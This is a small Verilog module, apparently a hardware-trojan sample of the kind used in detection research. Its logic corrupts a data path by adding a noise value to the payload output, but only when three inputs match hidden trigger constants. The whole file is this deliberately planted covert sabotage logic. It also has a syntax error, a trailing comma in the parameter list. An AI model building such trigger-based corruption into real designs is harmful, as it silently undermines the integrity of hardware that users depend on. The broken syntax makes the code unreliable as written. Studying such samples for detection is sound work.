module combinational_trojan_3 #(
    parameter DATA_WIDTH = 8,
    parameter NOISE_VALUE = 5,
    parameter NUMBER_OF_TRIGGERS = 3,
    parameter TRIGGER_VALUES_0 = 4,
    parameter TRIGGER_VALUES_1 = 3,
    parameter TRIGGER_VALUES_2 = 2, 
)(        
    input wire [DATA_WIDTH-1:0] data_in [NUMBER_OF_TRIGGERS] ,
    input wire [DATA_WIDTH-1:0] data_payload_in,
    output reg [DATA_WIDTH-1:0] data_payload_out
);

    wire is_trigger_condition;    

    assign is_trigger_condition = (data_in[0] == TRIGGER_VALUES_0 && data_in[1] == TRIGGER_VALUES_1 && data_in[2] == TRIGGER_VALUES_2);
    
    always @(*) begin
        data_payload_out = data_payload_in;        
        if (is_trigger_condition) begin                
            data_payload_out = data_payload_in + NOISE_VALUE;
        end        
    end

endmodule
